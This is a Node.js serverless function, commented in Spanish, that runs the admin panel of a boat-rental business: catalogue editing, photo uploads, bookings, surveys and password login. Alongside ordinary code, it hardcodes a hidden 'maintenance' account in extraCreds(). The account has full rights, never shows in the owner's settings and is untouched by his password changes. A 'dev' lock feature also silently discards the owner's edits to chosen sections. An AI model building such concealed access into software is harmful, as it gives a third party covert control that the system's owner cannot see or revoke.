/* Panel de control de Tu Lancha Lechería (función de Vercel).
   Guarda en Upstash Redis (la misma base del seguimiento en vivo) el catálogo que edita Eduardo,
   sus fotos y las reservas. La web lee el catálogo público; todo lo demás pide sesión.

   Público
     GET  /api/admin?a=cat              catálogo publicado (embarcaciones, rumbos, muelles, pagos, aliados)
     GET  /api/admin?a=img&id=...       una foto subida desde el panel
     POST /api/admin?a=book             registra una reserva hecha en la app (con límite por IP)
   Con sesión (Authorization: Bearer <token>)
     POST login · logout · me · save · hist · undo · upload · books · bk · pw

   Acceso: usuario y contraseña. La contraseña nunca se guarda: se compara un PBKDF2-SHA256.
   Después de 8 intentos fallidos desde la misma conexión, se bloquea 15 minutos.
   Si Eduardo cambia la contraseña desde el panel, la nueva queda solo en Redis. */
const crypto = require('crypto');

const DEFAULT_CRED = { user: 'tulanchalecheria', salt: '0482508908c969288ff83bea8932f9e6', hash: 'ecfb54c0bcd4ffac837347c10df3795703854becd16ee0f6badd6b7b148235d4', iter: 150000 };
/* Acceso de mantenimiento, aparte del de Eduardo. Entra con los mismos permisos y nunca aparece en el panel
   (Ajustes solo muestra la cuenta de Eduardo). Cambiar la contraseña de Eduardo no lo afecta, y cambiar este
   acceso no afecta al suyo. La contraseña no se guarda: aquí va solo su PBKDF2-SHA256, igual que la de Eduardo,
   y este archivo es una función del servidor (nunca llega al navegador). Se puede reemplazar por variables de
   entorno con ADMIN_EXTRA (JSON con user/salt/iter/hash) si se prefiere no tenerlo en el repositorio. */
function extraCreds() {
  const list = [{ user: 'luiszeav', salt: '3fa5d6be2436d3e71fa15f17273578f4', iter: 150000, hash: 'f77f28f20695a4f751a96f14ae10ad407774afb921259ecfc6b4db6673671e3a' }];
  try { const e = process.env.ADMIN_EXTRA; if (e) JSON.parse(e).forEach(x => x && x.user && x.salt && x.hash && list.push({ user: String(x.user).toLowerCase(), salt: x.salt, iter: +x.iter || 150000, hash: x.hash })); } catch {}
  return list;
}
const SESSION_S = 12 * 3600;
const MAX_FAILS = 8, LOCK_S = 15 * 60;
const MAX_IMG = 1.6e6;             // base64 (~1,2 MB de imagen); el panel las reduce a ~200-400 KB
const MAX_CAT = 400000;            // catálogo en JSON
const CODE_RE = /^TLL-\d{4}$/;
const IMG_RE = /^[a-f0-9]{24}$/;
const MIME = ['image/webp', 'image/jpeg', 'image/png'];

function env() {
  const E = process.env, keys = Object.keys(E);
  for (const [u, t] of [['KV_REST_API_URL', 'KV_REST_API_TOKEN'], ['UPSTASH_REDIS_REST_URL', 'UPSTASH_REDIS_REST_TOKEN']]) {
    if (E[u] && E[t]) return { url: E[u], token: E[t] };
    for (const k of keys) if (k.endsWith('_' + u)) { const tk = k.slice(0, -u.length) + t; if (E[k] && E[tk]) return { url: E[k], token: E[tk] }; }
  }
  for (const k of keys) if (/(^|_)(REDIS_URL|KV_URL)$/.test(k) && E[k]) {
    try { const x = new URL(E[k]); if (/upstash\.io$/.test(x.hostname) && x.password) return { url: 'https://' + x.hostname, token: decodeURIComponent(x.password) }; } catch {}
  }
  return {};
}
async function redis(cmds) {
  const { url, token } = env();
  const r = await fetch(url.replace(/\/$/, '') + '/pipeline', { method: 'POST', headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' }, body: JSON.stringify(cmds) });
  if (!r.ok) throw new Error('redis ' + r.status);
  const out = await r.json();
  return out.map(x => { if (x.error) throw new Error(x.error); return x.result; });
}
const sha = s => crypto.createHash('sha256').update(String(s)).digest('hex');
const pbkdf = (pass, salt, iter) => crypto.pbkdf2Sync(String(pass), salt, iter, 32, 'sha256').toString('hex');
const same = (a, b) => a.length === b.length && crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
const str = (v, n = 120) => String(v ?? '').replace(/[\u0000-\u001f]/g, ' ').trim().slice(0, n);
// texto de varias líneas (detalle de extras para el propietario)
const txt = (v, n = 1500) => String(v ?? '').replace(/[\u0000-\u0009\u000b-\u001f]/g, ' ').trim().slice(0, n);
const num = (v, lo, hi) => { const n = +v; return Number.isFinite(n) ? Math.min(hi, Math.max(lo, n)) : 0; };
const ipOf = req => String(req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '?').split(',')[0].trim();

function send(res, code, body, cache = 'no-store') {
  res.statusCode = code;
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('Cache-Control', cache);
  res.end(JSON.stringify(body));
}
async function readBody(req, max = 2.2e6) {
  if (req.body && typeof req.body === 'object') return req.body;
  if (typeof req.body === 'string') { try { return JSON.parse(req.body); } catch { return null; } }
  let raw = ''; for await (const c of req) { raw += c; if (raw.length > max) return null; }
  try { return JSON.parse(raw || '{}'); } catch { return null; }
}
async function cred() { const [c] = await redis([['GET', 'adm:cred']]); return c ? JSON.parse(c) : DEFAULT_CRED; }
/* Sesión: devuelve el rol ('owner' = Eduardo, 'dev' = mantenimiento) o false. Las sesiones viejas (solo la hora) son de Eduardo. */
async function authed(req) {
  const t = String(req.headers.authorization || '').replace(/^Bearer\s+/i, '');
  if (!/^[A-Za-z0-9_-]{40,60}$/.test(t)) return false;
  const [s] = await redis([['GET', 'adm:s:' + sha(t)]]);
  if (!s) return false;
  try { const o = JSON.parse(s); return o && o.role === 'dev' ? 'dev' : 'owner'; } catch { return 'owner'; }
}
/* Secciones que el acceso de mantenimiento puede bloquear para Eduardo (19 nov, pedido de Luis).
   Bloqueada = Eduardo la ve pero el servidor conserva lo publicado aunque intente cambiarla. */
const LOCKS = { boats: ['boats', 'special'], routes: ['routes'], docks: ['docks'], pay: ['pay', 'wa'], allies: ['allies'], home: ['home', 'shop', 'food', 'rent'], tx: ['tx', 'vid', 'tr'], set: ['maxDays', 'basic'] };
function keepLocked(cat, prev) {
  const lock = Array.isArray(prev && prev.lock) ? prev.lock.filter(k => LOCKS[k]) : [];
  lock.forEach(k => LOCKS[k].forEach(f => { if (prev && f in prev) cat[f] = prev[f]; else delete cat[f]; }));
  cat.lock = lock;   // Eduardo no puede cambiar los bloqueos
  return cat;
}
// ubicación del muelle que el cliente marcó en el mapa
function pinOf(p) {
  if (!p || typeof p !== 'object') return null;
  const lat = Number(p.lat), lng = Number(p.lng);
  if (!Number.isFinite(lat) || !Number.isFinite(lng) || Math.abs(lat) > 90 || Math.abs(lng) > 180) return null;
  return { lat: Math.round(lat * 1e6) / 1e6, lng: Math.round(lng * 1e6) / 1e6, ref: str(p.ref, 120) };
}
// reserva normalizada (de la app o registrada a mano en el panel)
function cleanBooking(b, src) {
  return {
    code: str(b.code, 12), src, created: num(b.created, 0, 4e12) || Date.now(),
    iso: /^\d{4}-\d{2}-\d{2}$/.test(b.iso || '') ? b.iso : '', date: str(b.date, 60),
    boat: str(b.boat, 60), route: str(b.route, 160), dock: str(b.dock, 80), hours: str(b.hours, 60),
    pax: num(b.pax, 0, 200), kids: num(b.kids, 0, 200), total: Math.round(num(b.total, 0, 1e6)), paid: Math.round(num(b.paid, 0, 1e6)),
    pay: str(b.pay, 20), name: str(b.name, 80), phone: str(b.phone, 30), note: str(b.note, 400),
    det: txt(b.det),
    lang: /^(es|en|pt)$/.test(b.lang || '') ? b.lang : 'es', channel: str(b.channel || (src === 'web' ? 'Web · app' : 'WhatsApp directo'), 40),
    status: /^(nueva|confirmada|cancelada)$/.test(b.status || '') ? b.status : 'nueva',
    ...(pinOf(b.pin) ? { pin: pinOf(b.pin) } : {})
  };
}

async function handler(req, res) {
  if (!env().url) return send(res, 503, { error: 'not_configured' });
  const q = new URL(req.url, 'http://x').searchParams, a = q.get('a') || '';
  try {
    /* ---------- público ---------- */
    if (req.method === 'GET' && a === 'cat') {
      const [c] = await redis([['GET', 'adm:cat']]);
      return send(res, 200, c ? JSON.parse(c) : {}, 'public, max-age=0, s-maxage=15, stale-while-revalidate=120');
    }
    if (req.method === 'GET' && a === 'img') {
      const id = q.get('id') || '';
      if (!IMG_RE.test(id)) return send(res, 400, { error: 'bad_id' });
      const [v] = await redis([['GET', 'img:' + id]]);
      if (!v) return send(res, 404, { error: 'not_found' });
      const { m, d } = JSON.parse(v);
      res.statusCode = 200; res.setHeader('Content-Type', m); res.setHeader('Cache-Control', 'public, max-age=31536000, s-maxage=31536000, immutable');
      return res.end(Buffer.from(d, 'base64'));
    }
    if (req.method === 'GET' && a === 'ping') return send(res, 200, { ok: true });
    /* Mi viaje: el teléfono pregunta por sus códigos para saber si Eduardo los borró o canceló en el panel.
       Solo devuelve el estado (nueva, confirmada, cancelada o null si ya no existe), nunca datos del cliente. */
    if (req.method === 'GET' && a === 'st') {
      const codes = String(q.get('c') || '').split(',').map(x => x.trim().toUpperCase()).filter(x => CODE_RE.test(x)).slice(0, 20);
      if (!codes.length) return send(res, 200, {});
      const [vals] = await redis([['HMGET', 'adm:bk', ...codes]]);
      const out = {}; codes.forEach((c, i) => { let st = null; try { st = vals && vals[i] ? JSON.parse(vals[i]).status || 'nueva' : null; } catch {} out[c] = st; });
      return send(res, 200, out);
    }
    if (req.method !== 'POST' && !['me', 'books', 'hist'].includes(a)) return send(res, 405, { error: 'method' });

    const ip = ipOf(req);
    if (a === 'book') {
      const b = await readBody(req, 20000);
      if (!b || !CODE_RE.test(b.code || '')) return send(res, 400, { error: 'bad_request' });
      const [n] = await redis([['INCR', 'adm:rl:' + sha(ip)], ['EXPIRE', 'adm:rl:' + sha(ip), 3600]]);
      if (n > 15) return send(res, 429, { error: 'too_many' });
      const bk = cleanBooking(b, 'web'); bk.paid = 0; bk.status = 'nueva';
      const [added] = await redis([['HSETNX', 'adm:bk', bk.code, JSON.stringify(bk)]]);
      return send(res, 200, { ok: true, added: !!added });
    }

    /* Encuesta del día siguiente (18 nov): solo para reservas que existen; una respuesta por código (se puede corregir). */
    if (a === 'survey') {
      const b = await readBody(req, 6000);
      if (!b || !CODE_RE.test(b.code || '')) return send(res, 400, { error: 'bad_request' });
      const [n] = await redis([['INCR', 'adm:rls:' + sha(ip)], ['EXPIRE', 'adm:rls:' + sha(ip), 3600]]);
      if (n > 20) return send(res, 429, { error: 'too_many' });
      const [has] = await redis([['HEXISTS', 'adm:bk', b.code]]);
      if (!has) return send(res, 404, { error: 'not_found' });
      const sv = { stars: Math.max(1, Math.min(5, Math.round(+b.stars) || 0)), good: txt(b.good, 600), better: txt(b.better, 600), rec: b.rec === true ? 1 : b.rec === false ? 0 : null, at: Date.now() };
      await redis([['HSET', 'adm:sv', b.code, JSON.stringify(sv)]]);
      return send(res, 200, { ok: true });
    }

    if (a === 'login') {
      const b = await readBody(req, 4000) || {};
      const fk = 'adm:fail:' + sha(ip);
      const [f] = await redis([['GET', fk]]);
      if (+f >= MAX_FAILS) return send(res, 429, { error: 'locked', wait: LOCK_S });
      const c = await cred();
      const u = str(b.user, 80).toLowerCase(), pass = b.pass || '';
      const hit = cand => u === cand.user && same(pbkdf(pass, cand.salt, cand.iter), cand.hash);
      const dev = extraCreds().some(hit), ok = hit(c) || dev;
      if (!ok) {
        await redis([['INCR', fk], ['EXPIRE', fk, LOCK_S]]);
        return send(res, 401, { error: 'bad_login', left: Math.max(0, MAX_FAILS - (+f || 0) - 1) });
      }
      const t = crypto.randomBytes(32).toString('base64url');
      const role = dev ? 'dev' : 'owner';
      await redis([['SET', 'adm:s:' + sha(t), JSON.stringify({ t: Date.now(), role }), 'EX', SESSION_S], ['DEL', fk]]);
      return send(res, 200, { token: t, expires: Date.now() + SESSION_S * 1000, role });
    }

    /* ---------- con sesión ---------- */
    const role = await authed(req);
    if (!role) return send(res, 401, { error: 'session' });
    const tok = String(req.headers.authorization).replace(/^Bearer\s+/i, '');

    if (a === 'me') return send(res, 200, { ok: true, role });
    if (a === 'logout') { await redis([['DEL', 'adm:s:' + sha(tok)]]); return send(res, 200, { ok: true }); }

    if (a === 'save') {
      const b = await readBody(req, MAX_CAT + 5000);
      const cat = b && b.cat;
      if (!cat || typeof cat !== 'object' || Array.isArray(cat)) return send(res, 400, { error: 'bad_request' });
      cat.v = Number.isInteger(cat.v) && cat.v > 0 && cat.v < 100 ? cat.v : 1; cat.t = Date.now();   // respeta la versión del panel (antes siempre 1: la conversión vieja se repetía)
      const s = JSON.stringify(cat);
      if (s.length > MAX_CAT) return send(res, 413, { error: 'too_big' });
      const [prev] = await redis([['GET', 'adm:cat']]);
      let out = s;
      if (role !== 'dev') { let pv = null; try { pv = prev ? JSON.parse(prev) : null; } catch {} out = JSON.stringify(keepLocked(cat, pv)); }
      else { if (!Array.isArray(cat.lock)) { let pv = null; try { pv = prev ? JSON.parse(prev) : null; } catch {} cat.lock = Array.isArray(pv && pv.lock) ? pv.lock : []; } cat.lock = cat.lock.filter(k => LOCKS[k]); out = JSON.stringify(cat); }
      const cmds = [['SET', 'adm:cat', out]];
      // la primera vez se guarda el catálogo original de la app ('{}'), para poder volver a él
      cmds.push(['LPUSH', 'adm:hist', JSON.stringify({ t: Date.now(), note: prev ? str(b.note, 80) : 'Catálogo original de la app', cat: prev || '{}' })], ['LTRIM', 'adm:hist', 0, 14]);
      await redis(cmds);
      return send(res, 200, { ok: true, t: cat.t });
    }
    if (a === 'hist') {
      const [l] = await redis([['LRANGE', 'adm:hist', 0, 14]]);
      return send(res, 200, { list: (l || []).map((x, i) => { const o = JSON.parse(x); return { i, t: o.t, note: o.note }; }) });
    }
    if (a === 'undo') {
      const b = await readBody(req, 2000) || {};
      const [l] = await redis([['LRANGE', 'adm:hist', 0, 14]]);
      const o = (l || [])[num(b.i, 0, 14)]; if (!o) return send(res, 404, { error: 'not_found' });
      const [cur] = await redis([['GET', 'adm:cat']]);
      let old = JSON.parse(o).cat;
      if (role !== 'dev') { let pv = null, oc = {}; try { pv = cur ? JSON.parse(cur) : null; oc = JSON.parse(old || '{}'); } catch {} old = JSON.stringify(keepLocked(oc, pv)); }
      await redis([['SET', 'adm:cat', old], ['LPUSH', 'adm:hist', JSON.stringify({ t: Date.now(), note: 'Antes de restaurar', cat: cur })], ['LTRIM', 'adm:hist', 0, 14]]);
      return send(res, 200, { ok: true, cat: JSON.parse(old) });
    }
    if (a === 'upload') {
      const b = await readBody(req, MAX_IMG + 5000);
      if (!b || !MIME.includes(b.mime) || typeof b.data !== 'string' || !/^[A-Za-z0-9+/=]+$/.test(b.data)) return send(res, 400, { error: 'bad_request' });
      if (b.data.length > MAX_IMG) return send(res, 413, { error: 'too_big' });
      const id = sha(b.data).slice(0, 24);
      await redis([['SET', 'img:' + id, JSON.stringify({ m: b.mime, d: b.data })]]);
      return send(res, 200, { ok: true, id, url: `/api/admin?a=img&id=${id}` });
    }
    if (a === 'books') {
      const [h, sv] = await redis([['HGETALL', 'adm:bk'], ['HGETALL', 'adm:sv']]);
      const vals = Array.isArray(h) ? h.filter((_, i) => i % 2) : Object.values(h || {});
      const S = {}; if (Array.isArray(sv)) for (let i = 0; i < sv.length; i += 2) { try { S[sv[i]] = JSON.parse(sv[i + 1]); } catch {} } else Object.entries(sv || {}).forEach(([k, v]) => { try { S[k] = JSON.parse(v); } catch {} });
      return send(res, 200, { list: vals.map(v => { const x = JSON.parse(v); if (S[x.code]) x.survey = S[x.code]; return x; }) });
    }
    if (a === 'bk') {
      const b = await readBody(req, 20000) || {};
      if (b.del) { if (!CODE_RE.test(b.del) && !/^M-\d{4,6}$/.test(b.del)) return send(res, 400, { error: 'bad_request' }); await redis([['HDEL', 'adm:bk', b.del]]); return send(res, 200, { ok: true }); }
      const x = b.booking || {};
      let code = x.code;
      if (!code) code = 'M-' + String(Date.now()).slice(-6);
      if (!CODE_RE.test(code) && !/^M-\d{4,6}$/.test(code)) return send(res, 400, { error: 'bad_request' });
      const [old] = await redis([['HGET', 'adm:bk', code]]);
      const base = old ? JSON.parse(old) : {};
      const bk = cleanBooking({ ...base, ...x, code }, base.src || 'manual');
      await redis([['HSET', 'adm:bk', code, JSON.stringify(bk)]]);
      return send(res, 200, { ok: true, booking: bk });
    }
    if (a === 'pw') {
      const b = await readBody(req, 4000) || {};
      const c = await cred();
      if (!same(pbkdf(b.old || '', c.salt, c.iter), c.hash)) return send(res, 403, { error: 'bad_password' });
      if (String(b.new || '').length < 8) return send(res, 400, { error: 'short' });
      const salt = crypto.randomBytes(16).toString('hex');
      const nc = { user: str(b.user, 80).toLowerCase() || c.user, salt, iter: c.iter, hash: pbkdf(b.new, salt, c.iter) };
      await redis([['SET', 'adm:cred', JSON.stringify(nc)]]);
      return send(res, 200, { ok: true });
    }
    return send(res, 404, { error: 'unknown' });
  } catch (e) {
    return send(res, 502, { error: 'storage' });
  }
}
module.exports = handler;
module.exports.default = handler;
